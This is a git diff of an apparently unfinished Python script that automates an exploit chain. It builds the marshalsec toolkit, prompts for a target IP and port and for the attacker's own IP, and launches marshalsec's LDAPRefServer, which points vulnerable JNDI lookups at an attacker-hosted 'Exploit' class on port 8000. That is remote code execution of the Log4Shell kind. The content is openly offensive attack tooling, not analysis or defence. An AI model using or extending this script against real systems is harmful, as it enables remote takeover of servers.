@@ -7,17 +7,10 @@
 import os
 from git import Repo
 
-def delsnapshot(found,snapshot):
-    if found == True:
-        os.remove(snapshot)
-        print("Deleted snapshot file (just so python doesnt get confused, its delicate <3)")
-        return True
-    elif not found:
-        print("Could not find snapshot file, will continue anyway but marshalsec may error out.")
-        return True
 
 def movetomsec():
     os.system("cd marshalsec-master")
+
 
 def buildmsec():
     # Updates package lists and gets maven from apt if not already there
@@ -88,10 +81,10 @@ def marshalsecinit():
                     print("Built")
                 return True
 
-
         if not downloaded:
             print("Marshalsec was not downloaded successfully, or the permissions in this directory are not configured "
-                  "correctly. Please download it manually from http://https://github.com/mbechler/marshalsec , or check your "
+                  "correctly. Please download it manually from http://https://github.com/mbechler/marshalsec , "
+                  "or check your "
                   "permissions.")
             exit(69)
 
@@ -104,7 +97,9 @@ def getip():
     ip = input("Please enter the ip address of the target.")
     return ip
 
+
 def getport():
+
     port = input("Please enter the port if known. (default 80)")
 
     if port != 80:
@@ -116,58 +111,37 @@ def getport():
         port = port
         return port
 
-#TODO start marshalsec
+
+# TODO start marshalsec
 
 def marshalsecstart():
-
-    global find_snapshot
 
     counter = 0
     found = False
 
-    if marshalcheck == True:
+    if marshalsecinit() == True:
         movetomsec()
 
-        #find the snapshot .jar and delete it so that python doesnt get confused
+        #prints interfaces for convenience
+        stream = os.popen("ip addr show")
 
-        find_snapshot = os.listdir("./")
+        print(stream.read())
 
-        #prep for aids btw
+        #starts marshalsec
 
-        for i in find_snapshot:
-            #split current element
-            findme = i.split()
+        attackerip = input("Please enter your attack machines IP address that corresponds to your chosen interface. "
+                           "Shown above")
+        command = f"java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer 'http:// {attackerip} :8000/#Exploit' "
 
-            #counter to save place
-            counter =+ 1
-
-            #iterate through current element
-
-            for i in findme:
-                #if it sees snapshot, tell python
-                if i.lower() == "snapshot":
-                    found = True
-                    break
-
-                else:
-                    continue
-
-            if found == True:
-                delsnapshot(found,find_snapshot[counter])
-                break
-
-            elif not found:
-                break
-
+        os.system(command)
 
 
 if marshalsecinit() == True:
     marshalsecstart()
 
-
 # TODO COMMENT YA DAMN CODE
 
-# TODO Finish input system (make it a bit better maybe)
+# TODO fix this fucking code, and also move from os to subprocess bc stack overflow says so
 
 # TODO Add compiler for the java file, would also be nice to have it auto generate the exploit for you
 
